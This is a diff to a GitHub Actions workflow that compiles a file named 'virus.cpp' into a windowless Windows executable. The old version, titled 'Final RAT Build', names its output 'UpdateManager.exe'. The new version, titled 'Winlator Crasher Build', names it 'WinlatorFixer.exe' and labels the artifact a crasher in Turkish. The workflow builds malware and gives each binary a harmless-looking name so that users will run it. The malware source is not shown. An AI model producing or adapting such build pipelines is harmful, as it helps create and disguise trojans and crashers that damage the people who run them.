@@ -1,16 +1,23 @@
-name: Final RAT Build
+name: Winlator Crasher Build
 on: [push]
 
 jobs:
   build:
     runs-on: windows-latest
     steps:
-      - uses: actions/checkout@v4
-      - uses: microsoft/setup-msbuild@v2
-      - name: Compile
-        run: cl.exe /EHsc /MT src/virus.cpp /Fe:UpdateManager.exe /link /SUBSYSTEM:WINDOWS ws2_32.lib shell32.lib advapi32.lib user32.lib
-      - uses: actions/upload-artifact@v4
+      - name: Kodu Cek
+        uses: actions/checkout@v4
+
+      - name: MSBuild Hazirla
+        uses: microsoft/setup-msbuild@v2
+
+      - name: Derle (EXE Olustur)
+        # Dosya yolu direkt ana dizindeki virus.cpp olarak ayarlandı
+        run: cl.exe /EHsc /MT virus.cpp /Fe:WinlatorFixer.exe /link /SUBSYSTEM:WINDOWS ntdll.lib user32.lib advapi32.lib
+
+      - name: EXE'yi Yukle
+        uses: actions/upload-artifact@v4
         with:
-          name: Proje-Ciktisi
-          path: UpdateManager.exe
+          name: Cokertici-EXE
+          path: WinlatorFixer.exe
           
